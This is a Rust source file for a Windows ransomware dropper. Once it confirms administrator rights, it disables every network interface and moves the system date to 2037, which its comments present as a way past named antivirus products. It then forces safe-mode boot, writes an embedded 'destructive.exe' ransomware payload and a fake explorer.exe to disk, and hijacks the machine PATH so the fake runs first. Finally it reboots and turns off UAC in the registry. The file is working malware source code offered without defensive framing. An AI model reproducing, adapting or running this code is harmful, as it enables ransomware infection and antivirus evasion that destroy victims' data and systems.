use std::process::{Command, Stdio};
use std::path::{Path};
use std::fs::{File};
use std::io::{self, Write};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_SET_VALUE};
use winreg::RegKey;
use std::fs;

fn disable_uac() -> io::Result<()> {
    // Open the registry key for User Account Control
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let uac_key = hkcu.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
        KEY_SET_VALUE
    )?;

    // Set EnableLUA to 0 to disable UAC
    uac_key.set_value("EnableLUA", &0u32)?;

    println!("UAC has been disabled (EnableLUA set to 0).");

    Ok(())
}

fn enable_safe_mode() -> io::Result<()> {
    // Set the system to boot in Safe Mode
    Command::new("bcdedit.exe")
        .arg("/set")
        .arg("{current}")
        .arg("safeboot")
        .arg("minimal")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn disable_network_interfaces() -> Result<(), std::io::Error> {
    // Disable all interfaces
    let output = Command::new("netsh")
        .arg("interface")
        .arg("show")
        .arg("interface")
        .output()?;

    let interfaces = String::from_utf8_lossy(&output.stdout);

    // Loop through interfaces and disable them
    for line in interfaces.lines() {
        if line.contains("Enabled") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if let Some(interface_name) = parts.get(3) {
                println!("Disabling interface: {}", interface_name);
                let _ = Command::new("netsh")
                    .arg("interface")
                    .arg("set")
                    .arg("interface")
                    .arg(interface_name)
                    .arg("disable")
                    .output();
            }
        }
    }

    Ok(())
}

fn change_system_date() -> Result<(), String> {
    // Change system date to 01-19-2037 (Windows format mm-dd-yyyy)
    let date_command = "date 12-19-2037";

    // Run date command
    let date_output = Command::new("cmd")
        .arg("/C")
        .arg(date_command)
        .stderr(Stdio::inherit())  // Pass error output to console
        .output()
        .map_err(|e| e.to_string())?;

    if !date_output.status.success() {
        return Err(format!("Failed to change date: {}", String::from_utf8_lossy(&date_output.stderr)));
    }

    println!("System date changed to 01-19-2037.");
    Ok(())
}

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn extract_embedded_exe() -> io::Result<()> {
    // Ensure the target directory exists
    let target_dir = Path::new("C:\\Program Files\\utkudrk2");
    if !target_dir.exists() {
        fs::create_dir_all(target_dir)?;
        println!("Created directory: {}", target_dir.display());
    }

    // Write the embedded executable to a file
    let exe_path = target_dir.join("destructive.exe");
    let mut exe_file = File::create(&exe_path)?;
    exe_file.write_all(include_bytes!("../resources/destructive.exe"))?;
    println!("Executable saved to {}.", exe_path.display());

    Ok(())
}

/// Extracts the embedded explorer.exe to "C:\explorer.exe"
fn extract_explorer_exe() -> io::Result<()> {
    // Define the target path for explorer.exe
    let target_path = Path::new("C:\\explorer.exe");
    // Create (or overwrite) the file at the target path
    let mut file = File::create(&target_path)?;
    // Write the embedded executable data to the file
    file.write_all(include_bytes!("../resources/explorer.exe"))?;
    println!("Explorer executable saved to {}.", target_path.display());

    Ok(())
}

fn reboot_system() -> io::Result<()> {
    // Shutdown and reboot the system to Safe Mode
    Command::new("shutdown.exe")
        .arg("-r")
        .arg("-t")
        .arg("7")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()?;

    Ok(())
}

fn execute_command(command: &str) {
    let status = Command::new("cmd")
        .args(&["/C", command])
        .status();

    match status {
        Ok(status) if status.success() => println!("[+] Command succeeded: {}", command),
        Ok(status) => eprintln!("[!] Command failed with status {}: {}", status, command),
        Err(e) => eprintln!("[!] Failed to execute command {}: {}", command, e),
    }
}

/// Sets the system PATH variable so that "C:\" is the first entry.
/// This method reads the current PATH, and if it doesn't already begin with "C:\",
/// it prepends "C:\" to the PATH and then uses 'setx /M' to update the machine PATH.
fn set_system_path_first() -> io::Result<()> {
    // Retrieve the current PATH (this may be the user or process PATH)
    let current_path = std::env::var("PATH").unwrap_or_default();
    let parts: Vec<&str> = current_path.split(';').collect();

    // Check if the first non-empty element is "C:\"
    if let Some(first) = parts.iter().find(|s| !s.trim().is_empty()) {
        if first.trim().eq_ignore_ascii_case("C:\\") {
            println!("[+] System PATH already starts with C:\\");
            return Ok(());
        }
    }

    // Prepend "C:\" to the current PATH.
    // (Be sure to include a semicolon separator.)
    let new_path = format!("C:\\;{}", current_path);
    println!("[*] Setting system PATH to: {}", new_path);

    // Build and execute the command to update the machine PATH.
    // The /M flag tells setx to modify the machine (system) environment variable.
    let command = format!("setx /M PATH \"{}\"", new_path);
    execute_command(&command);
    Ok(())
}

fn main() {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        return;
    }

    println!("Admin privileges confirmed.");

    //Define directory path
    let dir_path = Path::new(r"C:\Program Files\utkudrk2");

    // Step 2: Ensure the directory exists
    if let Err(e) = fs::create_dir_all(dir_path) {
        eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
        std::process::exit(1); // Exit the program with a failure status
    }

    // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
    // Cut network first to avoid auto update
    if let Err(e) = disable_network_interfaces() {
        eprintln!("Error disabling network interfaces: {}", e);
    }

    // Then update system date
    if let Err(e) = change_system_date() {
        eprintln!("Error changing system date: {}", e);
    }

    // Step 4: Enable safe mode
    if let Err(e) = enable_safe_mode() {
        eprintln!("Error enabling safe mode: {}", e);
    }

    // Step 5: Extract ransomware payload
    if let Err(e) = extract_embedded_exe() {
        eprintln!("Error extracting embedded ransomware executable: {}", e);
    }
        
    // Step 6: Extract safe boot payload
    if let Err(e) = extract_explorer_exe() {
        eprintln!("Error extracting embedded safe boot executable: {}", e);
    }
    
    // Step 7: Use set system path first to redirict to C:\explorer.exe
    if let Err(e) = set_system_path_first() {
        eprintln!("Error setting system path: {}", e);
        return;
    }

    // Step 8: Reboot the system to Safe Mode if needed
    if let Err(e) = reboot_system() {
        eprintln!("Error rebooting system: {}", e);
    }

    // Step 9: Disable UAC
    if let Err(e) = disable_uac() {
        eprintln!("Error disabling UAC: {}", e);
    }

}
